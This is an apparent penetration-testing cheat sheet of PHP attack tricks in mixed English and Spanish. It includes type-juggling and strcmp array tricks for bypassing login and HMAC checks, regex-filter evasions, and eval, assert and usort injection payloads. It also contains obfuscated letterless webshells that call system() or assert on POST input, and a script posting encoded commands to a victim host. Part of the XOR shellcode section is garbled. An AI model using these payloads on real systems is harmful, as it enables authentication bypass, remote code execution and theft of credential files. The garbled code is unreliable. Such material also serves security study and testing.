PHP Tricks (SPA)
Cookies common location:

This is also valid for phpMyAdmin cookies.

Cookies:

PHPSESSID
phpMyAdmin

Locations:

/var/lib/php/sessions

Bypassing PHP comparisons
Loose comparisons/Type Juggling ( == )

PHP comparison tables: https://www.php.net/manual/en/types.comparisons.php​
EN-PHP-loose-comparison-Type-Juggling-OWASP.pdf
EN-PHP-loose-comparison-Type-Juggling-OWASP.pdf - 590KB

    "string" == 0 -> True A string which doesn't start with a number is equals to a number

    "0xAAAA" == "43690" -> True Strings composed by numbers in dec or hex format can be compare to other numbers/strings with True as result if the numbers were the same (numbers in a string are interpreted as numbers)

    "0e3264578" == 0 --> True A string starting with "0e" and followed by anything will be equals to 0

    "0X3264578" == 0X --> True A string starting with "0" and followed by any letter (X can be any letter) and followed by anything will be equals to 0

    "0e12334" == "0" --> True This is very interesting because in some cases yo can control the string input of "0" and some content that is being hashed and compared to it. Therefore, if you can provide a value that will create a hash starting with "0e" and without any letter, you could bypass the comparison. You can find already hashed strings with this format here: https://github.com/spaze/hashes​

    "X" == 0 --> True Any letter in a string is equals to int 0

Con estas igualdades se pueden bypasear comparaciones de PHP (teniendo en cuenta que todo lo que se manda por parámetros normales de formulario siempre son strings).
Sobre todo usando el truco de String que empieza por "0e" siempre es igual a "0", así si hay que pasar un hmac y podemos alterar valores, podemos enviar como hmac simplemente "0" y si el hmac sale que vale "0eXXXXXXXXXXX" pues dará correcto y se lo tragará
Se puede intentar enviar los datos encodeados como json a ver si los lee (hay que cambiar la cabecera de tipo de datos para decir que es json y rezar para que se lo coma) (en json se elige el tipo de datos)

​https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09​
in_array()

Type Juggling also affects to the in_array() function by default (you need to set to true the third argument to make an strict comparison):

$values = array("apple","orange","pear","grape");
var_dump(in_array(0, $values));
//True
var_dump(in_array(0, $values, true));
//False

strcmp()/strcasecmp()

If this function is used for any authentication check (like checking the password) and the user controls one side of the comparison, he can send an empty array instead of a string as the value of the password (https://example.com/login.php/?username=admin&password[]=) and bypass this check:

if (!strcmp("real_pwd","real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
if (!strcmp(array(),"real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password

The same error occurs with strcasecmp()
Strict type Juggling

Even if === is being used there could be errors that makes the comparison vulnerable to type juggling. For example, if the comparison is converting the data to a different type of object before comparing:

(int) "1abc" === (int) "1xyz" //This will be true

preg_match(/^.*/)

preg_match() could be used to validate user input (it checks if any word/regex from a blacklist is present on the user input and if it's not, the code can continue it's execution).
New line bypass

However, when delimiting the start of the regexppreg_match() only checks the first line of the user input, then if somehow you can send the input in several lines, you could be able to bypass this check. Example:

$myinput="aaaaaaa
11111111"; //Notice the new line
echo preg_match("/1/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/1.*$/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/^.*1/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
echo preg_match("/^.*1.*$/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"

To bypass this check you could send the value with new-lines urlencoded (%0A) or if you can send JSON data, send it in several lines:

{
  "cmd": "cat /etc/passwd"
}

Find an example here: https://ramadistra.dev/fbctf-2019-rceservice​
Length error bypass

(This bypass was tried apparently on PHP 5.2.5 and I couldn't make it work on PHP 7.3.15)
If you can send to preg_match() a valid very large input, it won't be able to process it and you will be able to bypass the check. For example, if it is blacklisting a JSON you could send:

payload = '{"cmd": "ls -la", "injected": "'+ "a"*1000000 + '"}'

From: https://medium.com/bugbountywriteup/solving-each-and-every-fb-ctf-challenge-part-1-4bce03e2ecb0​
More tricks

register_globals: En PHP < 4.1.1 o si se ha configurado mal puede ser que las register_globals estén activas (o se esté imitando su comportamiento). Esto implica que en variables globales como $_GET si estas poseen un valor por ejemplo $_GET["param"]="1234", puedes acceder a este mediante $param. Por lo tanto, enviando parámetros de Get o Post se pueden sobreescribir variables que se usan dentro del código.

Las variables de sesión (asociadas al PHPSESSION) de un dominio se guardan en el mismo sitio, por lo tanto si dentro de un dominio se usan distintas cookies en distintos paths se puede hacer que un path acceda a la cookie del otro accediendo a dicho path con la cookie del otro. De esta forma si los dos paths acceden a una variable con el mismo nombre puedes hacer que el valor de dicha variable en el path1 se aplique al path2. Y entonces el path2 tomará como válidas las variables del path1 (al ponerle a la cookie el nombre que le corresponde en el path2).

Dos usuarios generados a la vez pueden tener la misma cookie (si la cookie depende del tiempo).

When you have the usernames of teh users of the machine. Check the address: /~<USERNAME> to see if the php directories are activated.

​LFI and RCE using php wrappers​
Code execution

system("ls");
`ls`;
shell_exec("ls");

​Check this for more useful PHP functions​
Code execution using preg_replace()

preg_replace(pattern,replace,base)
preg_replace("/a/e","phpinfo()","whatever")

To execute the code in the "replace" argument is needed at least one match.
This option of preg_replace has been deprecated as of PHP 5.5.0.
Code execution with Eval()

'.system('uname -a'); $dummy='
'.system('uname -a');#
'.system('uname -a');//
'.phpinfo().'
<?php phpinfo(); ?>

Code execution with Assert()

Esta función dentro de php permite ejecutar código que está escrito en un string con el objetivo de que se devuelva true o false (y dependiendo de esto alterar la ejecución). Por lo general se introducirá la variable del usuario entre medias de un string. Por ejemplo: assert("strpos($_GET['page']),'..') === false") --> En este caso el payload para ejecutar un comando podría ser:

?page=a','NeVeR') === false and system('ls') and strpos('a

El caso es que hay que romper la query, ejecutar algo y volver a arreglarla (para ello nos servimos del "and" o "%26%26" o "|" --> el "or", "||" no funcionan pues si la primera es cierta deja de ejecutar y el ";" no funciona pues solo ejecuta la primera parte).

Other option is to add to the string the execution of the command:  '.highlight_file('.passwd').'

Other option (if you have the internal code) is to modify some variable to alter the execution: $file = "hola"
Code execution with usort()

This function is used to sort an array of items using an specific function.
To abuse this function:

<?php usort(VALUE, "cmp"); #Being cmp a valid function ?>
VALUE: );phpinfo();#
​
<?php usort();phpinfo();#, "cmp"); #Being cmp a valid function ?>

<?php
function foo($x,$y){
    usort(VALUE, "cmp");
}?>
VALUE: );}[PHP CODE];#
​
<?php
function foo($x,$y){
    usort();}phpinfo;#, "cmp");
}?>

You can also use // to comment the rest of the code.

To discover the number of parenthesis that you need to close:

    ?order=id;}//: we get an error message (Parse error: syntax error, unexpected ';'). We are probably missing one or more brackets.

    ?order=id);}//: we get a warning. That seems about right.

    ?order=id));}//: we get an error message (Parse error: syntax error, unexpected ')' i). We probably have too many closing brackets.

Code execution via .httaccess

If you can upload a .htaccess, then you can configure several things and even execute code (configuring that files with extension .htaccess can be executed).

Different .htaccess shells can be found here​
PHP Static analysis

Look if you can insert code in calls to these functions (from here):

exec, shell_exec, system, passthru, eval, popen
unserialize, include, file_put_cotents
$_COOKIE | if #This mea

If yo are debugging a PHP application you can globally enable error printing in/etc/php5/apache2/php.ini adding display_errors = On and restart apache : sudo systemctl restart apache2
Execute PHP without letters

​https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/​
Using octal

$_="\163\171\163\164\145\155(\143\141\164\40\56\160\141\163\163\167\144)"; #system(cat .passwd);

XOR

$_=("%28"^"[").("%33"^"[").("%34"^"[").("%2c"^"[").("%04"^"[").("%28"^"[").("%34"^"[").("%2e"^"[").("%29"^"[").("%38"^"[").("%3e"^"["); #show_source
$__=("%0f"^"!").("%2f"^"_").("%3e"^"_").("%2c"^"_").("%2c"^"_").("%28"^"_").("%3b"^"_"); #.passwd
$___=$__; #Could be not needed inside eval
$_($___); #If ¢___ not needed then $_($__), show_source(.passwd)

XOR Shellcode (inside eval)

#!/bin/bash
​
if [[ -z $1 ]]; then
  echo "USAGE: $0 CMD"
  exit
fi
​
CMD=$1
CODE="\$_='\

lt;>/'^'{{{{';\${\$_}[_](\${\$_}[__]);" `$_='

lt;>/'^'{{{{'; --> _GET` `${$_}[_](${$_}[__]); --> $_GET[_]($_GET[__])` `So, the function is inside $_GET[_] and the parameter is inside $_GET[__]` http --form POST "http://victim.com/index.php?_=system&__=$CMD" "input=$CODE"

Perl like

<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E 
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;
 
$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;
 
$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);


